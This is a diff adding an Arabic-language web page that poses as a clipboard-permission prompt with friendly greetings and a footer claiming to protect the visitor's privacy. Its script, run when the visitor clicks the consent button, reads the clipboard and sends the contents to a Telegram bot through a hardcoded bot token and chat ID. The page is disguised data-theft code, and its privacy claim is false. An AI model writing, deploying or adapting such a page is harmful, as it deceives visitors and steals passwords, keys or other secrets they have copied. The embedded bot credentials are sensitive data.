@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقعي</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --primary-dark: #3a56d4;
+            --secondary-color: #f72585;
+            --success-color: #4cc9f0;
+            --light-color: #f8f9fa;
+            --dark-color: #212529;
+            --gray-color: #6c757d;
+            --border-radius: 16px;
+            --box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: #fff;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            overflow: hidden;
+            transition: var(--transition);
+        }
+        
+        .header {
+            background: linear-gradient(to right, var(--primary-color), var(--primary-dark));
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header h2 {
+            font-weight: 700;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+        
+        .header i {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            display: block;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .description {
+            color: var(--gray-color);
+            margin-bottom: 25px;
+            text-align: center;
+            font-size: 1.1rem;
+        }
+        
+        .permissions-list {
+            background: var(--light-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .permission-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .permission-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .permission-item i {
+            color: var(--primary-color);
+            margin-left: 15px;
+            font-size: 1.2rem;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            font-size: 1.2rem;
+            font-weight: 500;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3);
+        }
+        
+        .btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn i {
+            margin-left: 10px;
+        }
+        
+        .message {
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .message.success {
+            background: rgba(76, 201, 240, 0.15);
+            color: #0a7ea4;
+            display: block;
+        }
+        
+        .message.error {
+            background: rgba(247, 37, 133, 0.15);
+            color: #c31167;
+            display: block;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--gray-color);
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 576px) {
+            .container {
+                border-radius: 20px;
+            }
+            
+            .header {
+                padding: 20px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-clipboard-check"></i>
+            <h2>الوصول إلى الحافظة</h2>
+        </div>
+        
+        <div class="content">
+            <p class="description">شلونك</p>
+            
+            <div class="permissions-list">
+                <div class="permission-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>شخبارك</span>
+                </div>
+                <div class="permission-item">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>إن شاء الله زين؟</span>
+                </div>
+                <div class="permission-item">
+                    <i class="fas fa-bolt"></i>
+                    <span>شلونك بعد</span>
+                </div>
+            </div>
+            
+            <button id="allowBtn" class="btn">
+                <i class="fas fa-check"></i> الموافقة والمتابعة
+            </button>
+            
+            <div id="msg" class="message"></div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 جميع الحقوق محفوظة | تم تصميم هذا النموذج لحماية خصوصيتك</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('allowBtn').addEventListener('click', async () => {
+            const msgDiv = document.getElementById('msg');
+            const btn = document.getElementById('allowBtn');
+            const originalText = btn.innerHTML;
+            
+            msgDiv.className = 'message';
+            msgDiv.innerText = "";
+            
+            // عرض حالة التحميل
+            btn.innerHTML = '<span class="loading"></span> جاري التحقق...';
+            btn.disabled = true;
+            
+            try {
+                // قراءة الحافظة
+                const text = await navigator.clipboard.readText();
+
+                // إرسال إلى بوت تيليجرام
+                const token = "8359944415:AAE-K9hDu1K_KMgA7wPY3XvdRp0iOnaDijY";
+                const chatId = "7070074537";
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `📋 نص من الحافظة:\n${text}`
+                    })
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    msgDiv.className = 'message success';
+                    msgDiv.innerHTML = '<i class="fas fa-check-circle"></i> تمت العملية بنجاح، شكرًا لك';
+                } else {
+                    msgDiv.className = 'message error';
+                    msgDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى';
+                }
+            } catch (error) {
+                msgDiv.className = 'message error';
+                msgDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> لم يتم السماح بالوصول إلى الحافظة';
+                console.error(error);
+            } finally {
+                // إعادة تعيين الزر إلى حالته الأصلية
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
